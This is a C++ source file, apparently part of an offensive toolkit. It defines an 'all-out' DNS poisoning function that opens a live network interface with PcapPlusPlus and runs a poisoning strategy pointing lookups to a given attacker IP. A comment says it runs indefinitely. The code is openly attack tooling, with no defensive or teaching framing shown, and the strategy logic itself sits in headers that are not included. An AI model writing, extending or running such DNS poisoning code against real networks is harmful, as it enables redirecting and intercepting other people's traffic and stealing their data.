#include "dns_poisoning/public.h"
#include "PcapLiveDevice.h"
#include "PcapLiveDeviceList.h"
#include "dns_poisoning/all_out.h"
#include "dns_poisoning/dns_poisoning_strategy.h"
#include <memory>
#include <stdexcept>

/**
 * In the current implementation this method will not terminate and keep
 * peforming the attack.
 */
void ATK::DNS::allOutPoison(const AllOutPoisonOptions &options) {
    auto* device =
        pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIpOrName(
            options.ifaceIpOrName);

    if (device == nullptr || !device->open()) {
        throw std::runtime_error("Couldn't open device");
    }

    std::unique_ptr<ATK::DNS::AllOutDnsPoisoningStrategy> strategy;
    pcpp::IPv4Address attackerIp(options.attackerIp);
    strategy = AllOutDnsPoisoningStrategy::Builder(device)
               .attackerIp(attackerIp)
               .build();
    

    DnsPoisoningContext dnsPoisoningContext(std::move(strategy));

    dnsPoisoningContext.execute();
}
